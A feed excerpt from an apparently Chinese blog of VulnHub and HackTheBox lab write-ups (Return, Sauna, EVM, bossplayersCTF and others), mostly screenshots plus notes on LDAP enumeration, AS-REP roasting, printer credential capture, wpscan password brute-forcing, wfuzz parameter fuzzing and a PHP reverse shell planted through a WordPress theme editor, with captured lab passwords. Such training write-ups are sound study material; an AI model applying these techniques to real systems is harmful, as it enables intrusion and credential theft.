&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb703cf6f6f1a8f62cbdb8306d66ae87d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb73e481484e074eb57f153e54dd1d8ce%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0c9c64027ec18b85e7b1b5d1d36064c2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现密码&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEaa2775d16efd1941c7a0814f97e739d7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;发现aveng用户的账号密码&lt;/p&gt;
&lt;p&gt;echo &amp;ldquo;user:aveng&amp;rdquo;&lt;/p&gt;
&lt;p&gt;echo &amp;ldquo;password:kaizen+80&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE21510db92f78eac2eb74f03d403debe2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfdd9a1ee2383c43bcc368215537e3f31%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE96a04c6fc08b449276288ec62e5ee018%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x014 mhz_cxf c1f </title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x014-mhz_cxf-c1f-/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x014-mhz_cxf-c1f-/</guid>
      <description>&lt;p&gt;该靶机和靶机4问题一样，需要修改网卡配置文件才能获取到IP地址，修改方式一样&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf1d943a5f44d6ecd2daedc184efd56b2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;web渗透&#34;&gt;web渗透&lt;/h1&gt;
&lt;p&gt;目录扫描：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbe31d832ad093168a0140649fa3c24d6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7f713e83c70b30fa2d4cfc48a156f137%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;first_stage:flagitifyoucan1234&lt;/p&gt;
&lt;p&gt;尝试登录，说实话有点意外，这么简单？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8925d14b14e6b644806a65a2207dc24d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;看了一圈，没发现提权点，看home目录下还有一个用户，可能需要再切换一些用户?&lt;/p&gt;
&lt;p&gt;后面卡住没办法了，看了WP，我大概也猜到了是家目录下的图片有隐藏信息，但是这一块儿的知识确实较为欠缺。这里隐藏图片信息的获取方式：&lt;/p&gt;
&lt;p&gt;steghide工具：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2f9fc7625f157171892c98f2ebbd5849%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;提取&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo steghide extract -sf xxx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcfa5c5c90d855536d043708ab9fd1fd5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5f767ee1e5e6baa794ece946bdc70adb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE467fab89458d0b4d9092ba6e22cf9150%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;在知道如何提取图片隐藏信息的情况下，该靶机几乎就没有难度了&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X014 Return</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x014-return/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x014-return/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe382420ae6c92d98a37732267ce502eaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEda43ac946da8dcb59c3afe808daeb124image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbd2dd6cc4db68b83646dbf96165b441eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;简单看了一下端口开放情况，存在一个80 http端口，5985 winrn端口，445端口，389 ldap等。&lt;/p&gt;
&lt;p&gt;域名：return.local&lt;/p&gt;
&lt;p&gt;主机名：PRINTER&lt;/p&gt;
&lt;p&gt;先看445吧：&lt;/p&gt;
&lt;p&gt;失败，没有匿名共享&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEba2a5a86757af35aac982a2fdd0867e9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后看ldap有没有匿名访问：&lt;/p&gt;
&lt;p&gt;有，匿名访问：&lt;/p&gt;
&lt;p&gt;罗列用户名：&lt;/p&gt;
&lt;p&gt;发现没有东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfcbb23001a2bfd7fc6ae55ca963c4049image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看来目标应该是从80端口下手了，80端口是个打印机，用户名为svc-printer，多半是主机用户名了：&lt;/p&gt;
&lt;p&gt;尝试进行密码爆破，失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4d749002945688c86db1e87c25d04735image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;AS-REP Roasting试一下&lt;/p&gt;
&lt;p&gt;失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb3e47c3b025498e889b144cd31cd044bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;研究一下这个打印机怎么打：&lt;/p&gt;
&lt;p&gt;NTLM relay:&lt;/p&gt;
&lt;p&gt;居然直接成功了，还抓的明文密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9a9b4e0b1a11e12d39024ea17e2b2ddbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;[LDAP] Cleartext Client   : 10.10.11.108&lt;/p&gt;
&lt;p&gt;[LDAP] Cleartext Username : return\svc-printer&lt;/p&gt;
&lt;p&gt;[LDAP] Cleartext Password : 1edFg43012!!&lt;/p&gt;
&lt;p&gt;登录winrm，拿到flag&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2b70a385d46e20c450d99b858254e3ffimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用bloodhound.py:&lt;/p&gt;
&lt;p&gt;分析结果，其实只能通过本地提权来进行，然后利用dcsync达到域管理员组：&lt;/p&gt;
&lt;p&gt;查看该成员的信息，可以发现该成员属于高价值目标组，SERVER &lt;a href=&#34;http://OPERATORS@RETURN.LOCAL&#34;&gt;OPERATORS@RETURN.LOCAL&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE287aadd75af37792b33b0d28e6d9cc59image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;winpe:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4b03948e76b801743e229db82977d14fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;改组成员可以修改服务，我们可以创建一个服务来提权：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEafd9dff26e6b60b5736c08db8187220fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;提权成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd0b0d47f3716e70a6f97c6022f336ed9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x015 bossplayersCTF 1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x015-bossplayersctf-1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x015-bossplayersctf-1/</guid>
      <description>&lt;p&gt;开机需要解决一下网络问题，这次是debian，配置文件为/etc/network/interface&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描：&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE65491538197371c76ba50372cd5caa08%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;web渗透&#34;&gt;WEB渗透&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb244f6293e33d32b5bd9fb119e925f7f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;打开页面提示有域名，修改hosts文件，sudocuong.com&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9b7fce60ba5dc47949aa630f1bddf3f2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;再扫一次：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc5621ff989caee27d13a5452097fb451%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;bG9sIHRyeSBoYXJkZXIgYnJvCg==&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEebd2792333eb5767cf8ac49244f17d6d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可能不是密码？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1383bf04463fdd72e2af4136069e29f1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后是logs.php，没发现什么可用信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE45e443abea27b61380df0adc5a7f3c62%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现线索，看起来有点像base64：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1250ca566a6e5f70633be2ae65862bf8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;多次解码后：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE27baa57e633cda4c4a6a7908a0580a2a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfe2a17c81605db7e6dd74a99e90f5d1e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe2535ab08bc2b4d8948c6a9b88690fb1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;值得一提这里可以使用wfuzz把cmd使出来：&lt;/p&gt;
&lt;p&gt;sudo wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u &lt;a href=&#34;http://sudocuong.com/workinginprogress.php?FUZZ=id&#34;&gt;http://sudocuong.com/workinginprogress.php?FUZZ=id&lt;/a&gt; &amp;ndash;hw 36&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2cb2e270dfe2bed862f2b3985558a268%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEce43b0818634200760fd4941be3b7df9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd60795c09ff134ad0cf4e0aab006b3e8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X015 Sauna</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x015-sauna/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x015-sauna/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE49ac89b8d9fc975a54b7bbd64c81db25image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdf27ea5a3375f8849e59ef7135199357image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9051728dcb75e68b87fda147a0f15623image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;基本信息：主机名：SAUNA，域名：EGOTISTICAL-BANK.LOCAL&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;大致看了一下端口开放情况，主要是445\389\5985\80比较关键：&lt;/p&gt;
&lt;p&gt;先看80：&lt;/p&gt;
&lt;p&gt;看样子是个金融贷款公司，可能有漏洞？&lt;/p&gt;
&lt;p&gt;然后是445，不存在匿名访问：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf395e6bfb4e6a5391c26bc246f0182caimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后是389，看看有没有匿名枚举，有的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe6e0627ba3dd46051579f4fd3135285cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;试试:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE43345cdd445fe6117b1b694db608d3d9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf8a1b0a0822276cbe6ce2f1bfc8ebac3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后用kerbrute看看这些用户是否是可用的，发现没有可用的用户，那么只能说ldap泄露的账户不完全正确：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE48192919b79c49373f50b68bbcdaeeb1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么只能试试cewl获取的信息是否正确了，有一个用户：sauna&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcd3e18432c5305db44589e2b48082706image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个用户也失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4d8ac5327052431929313383e3827decimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;cewl可能不太行，试试手动：&lt;/p&gt;
&lt;p&gt;首字母+名字&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe1ed4fa76f0606bf81040ab0b065c13eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;AS-REP成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE99cb7b56363e8a08f851455e378a73aaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解hash:&lt;/p&gt;
&lt;p&gt;Thestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbf086419fe9e18a0f6e1a78b3aeab7c1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;由于5985的存在，可用winrm:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5a8c2e2dca84e63b0034bc97d00fb825image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;bloodhound和winpeass操作：&lt;/p&gt;
&lt;p&gt;疑似可以提权，但是好像没有配合的地方：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcd7c2c92a2ab22d533cbd50fb06894caimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后看看bloodhound，不知道为什么，使用exe输出的内容无法上传分析，使用py 生成的可以：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE24daefd682c0181e3f3a5c3bf89b4ae5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么关键就是他了：&lt;/p&gt;
&lt;p&gt;SVC_LOANMGR&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdc67e192d7681daccaf2764dd61b32c1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;Kerberoasting失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbfa3e719d7c02949707bc314de0fa788image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;再仔细看看内容：&lt;/p&gt;
&lt;p&gt;原来有密码：&lt;/p&gt;
&lt;p&gt;DefaultDomainName             :  EGOTISTICALBANK&lt;/p&gt;
&lt;p&gt;DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x016 EVM 1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x016-evm-1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x016-evm-1/</guid>
      <description>&lt;p&gt;好好好，已经连着三台都需要改网卡名称了，都喜欢用&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEec33d9c53ab52e5d30804d0cba6b40b0%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc1f1f222621f176769defc50c753da80%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;WPscan，枚举用户：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE61f70385ca0330c87143354f2299a84a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;爆破成功：&lt;/p&gt;
&lt;p&gt;sudo wpscan &amp;ndash;url &lt;a href=&#34;http://192.168.56.103/wordpress/&#34;&gt;http://192.168.56.103/wordpress/&lt;/a&gt; -P /usr/share/wordlists/rockyou.txt -U c0rrupt3d_brain&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEda459d388f5d071327af0d510c1224c2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;Username: c0rrupt3d_brain, Password: 24992499&lt;/p&gt;
&lt;p&gt;在编辑主题处可上传php反弹getsgell：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6b29a45700c218c854458b710a1cf5f2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;此处路径为：/wordpress/wp-content/themes/twentysixteen/404.php&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc48c84d9be6f694e699cec36c80cff33%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;疑似root 密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE64312b9e53bb9c56bd7c9c99f61f808e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;居然这么简单&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEeb75c202a1d743e1fe977f978573f779%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X016 Support</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x016-support/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x016-support/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5210351ecaab4ed72e1b4bf8ee75765d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEed69e887f32981ad919d9524cb6f0090%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;没有开放HTTP协议，主要是通过域内渗透方式进行&lt;/p&gt;
&lt;p&gt;SMB匿名登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbff327d0f4c284b632ee844164d0370b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE88308eb72b82e88e52dc73b8cbf33134%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这出现一个问题，不知到为啥，抓包看不到程序的发包&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb07edaf8d168cda964765ef93f596c6e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;主要考点：LDAP 轻量目录访问协议，理解上更像是一个树状图&lt;/p&gt;
&lt;p&gt;ldapsearch似乎-h与-p结合的使用方式被停用了？，帮助里面没看到这个用法，只能用-H了，&lt;/p&gt;
&lt;p&gt;-x使用简单认证&lt;/p&gt;
&lt;p&gt;-D用户名&lt;/p&gt;
&lt;p&gt;-w密码&lt;/p&gt;
&lt;p&gt;-W交互式输入密码&lt;/p&gt;
